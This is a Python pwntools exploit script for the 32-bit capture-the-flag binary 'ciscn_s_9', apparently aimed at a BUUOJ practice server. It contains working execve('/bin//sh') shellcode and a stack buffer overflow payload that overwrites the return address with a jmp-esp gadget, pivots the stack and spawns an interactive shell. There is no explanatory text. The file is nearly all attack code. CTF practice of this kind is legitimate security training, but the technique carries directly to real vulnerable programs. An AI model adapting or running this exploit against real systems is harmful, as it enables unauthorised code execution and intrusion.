from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["node4.buuoj.cn",27736]
#libc=ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./ciscn_s_9")
    context(arch='i386', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'i386', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

#gdb.attach(p, 'b *0x8048531')

ru(b'>\n')
payload = asm('''
    xor ecx,ecx
    mul ecx
    push eax
    mov al,0xb
    push 0x68732f2f   
    push 0x6e69622f   
    mov ebx,esp
    int 0x80
''')
payload = payload.ljust(0x24, b'\x00') + p32(0x8048554) + asm('sub esp, 0x28;call esp')
sl(payload)

shell()
